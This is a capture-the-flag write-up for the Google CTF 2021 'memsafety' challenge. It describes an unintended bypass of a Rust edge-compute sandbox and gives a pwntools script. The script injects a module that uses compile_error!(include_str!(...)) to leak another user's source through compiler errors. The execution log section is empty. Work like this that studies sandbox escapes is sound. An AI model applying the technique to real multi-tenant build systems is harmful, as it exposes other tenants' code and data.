# Memsafety challenge

Task description:
```
Provide a snippet of Rust code to run as an app in our edge compute.
We created a sandbox that doesn't allow any unsafe code and limits
what can be run, so we can be sure the different apps are well
isolated.

```
* The task was solved by 49 teams
* The attachment aka the "public" part that the CTF participants got can be seen here: https://github.com/google/google-ctf/tree/master/2021/quals/pwn-memsafety/attachments

# Our unintended solution

TL;DR: We just finished the`pub mod user {` module and created another one that caused the compilation error and was not checked by the AST(?) nodes visitor sandbox/checker.

```python
from pwn import *

code = '''
    pub struct State();
    
    impl State {
        pub fn new() -> prelude::Box<dyn prelude::Service> {
            prelude::Box::new(State())
        }
    }

    impl prelude::Service for State {
        fn handle(&mut self, s: &str) {
            use prelude::*;
            prelude::log!("str={}", s);
        }
    }
}

pub mod bypass{
    pub fn foo() {
        compile_error!(include_str!("../../user-1/src/lib.rs"));
        // prelude::log!("LOL");
    }
'''
code += 'EOF'

if args.REMOTE:
    io = remote(args.HOST or 'memsafety.2021.ctfcompetition.com', args.PORT or 1337)
else:
    io = process('./chal.py')


io.recvuntil('===== Enter partial source for edge compute app (EOF to finish):\n')

io.sendline(code)

#io.shutdown('send')

print(io.recvall().decode())
```


Execution log (local, remote is down already):
